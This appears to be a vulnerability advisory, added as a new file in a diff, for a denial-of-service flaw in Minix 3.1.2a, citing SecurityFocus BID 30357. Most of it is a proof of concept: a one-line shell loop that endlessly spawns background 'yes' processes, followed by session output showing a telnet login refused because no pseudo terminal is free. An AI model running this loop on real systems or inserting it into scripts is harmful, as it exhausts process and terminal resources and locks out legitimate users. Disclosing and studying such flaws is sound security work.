@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/30357/info
+
+Minix is prone to a denial-of-service vulnerability.
+
+An attacker can exploit this issue to prevent users from opening new pseudo terminals, denying service to legitimate users.
+
+Minix 3.1.2a is vulnerable; other versions may also be affected. 
+
+$ uname -a
+Minix 192.168.1.2 3 1.2a i686
+$ while true ; do (yes "yes yes minix uh ah"&) ; done
+[snip snip]
+$ ^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C
+
+...disconnected
+telnet 192.168.1.2
+Trying 192.168.1.2...
+Connected to 192.168.1.2.
+Escape character is '^]'.
+I am sorry, but there is no free PTY left!
+Connection closed by foreign host. 
